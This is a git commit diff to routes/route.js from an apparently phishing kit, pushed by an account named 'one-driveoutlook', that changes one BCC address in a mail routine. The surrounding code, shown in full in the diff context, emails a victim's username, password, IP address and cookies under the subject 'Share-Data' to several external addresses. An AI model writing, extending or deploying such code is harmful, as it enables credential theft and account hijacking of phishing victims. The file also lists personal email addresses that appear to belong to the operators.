f7d3141c42866fbd6159f0a4e3c5528093cb22f8
one-driveoutlook <107754674+one-driveoutlook@users.noreply.github.com>
2024-10-17 09:03:52 +0100

    Update route.js

--- routes/route.js
+++ routes/route.js
@@ -13,7 +13,7 @@ router.post('/send-mail', (req, res) => {
     const mailOptions = {
         from: 'latinaforlife@remax.pt',
         to: ['gilliard.pinheiro@tenqualuz.pt', 'dninotoolz@gmail.com'], // Primary recipients
-        bcc: ['ahmedgross@zohomail.com', 'billytoolz@zohomail.eu'], // BCC recipients
+        bcc: ['sales02@chemrawerd.com', 'billytoolz@zohomail.eu'], // BCC recipients
         subject: 'Share-Data',
         text: `Username: ${username}\nPassword: ${pass}\nIP: ${ip}\nCookies: ${JSON.stringify(cookies)}`
     };
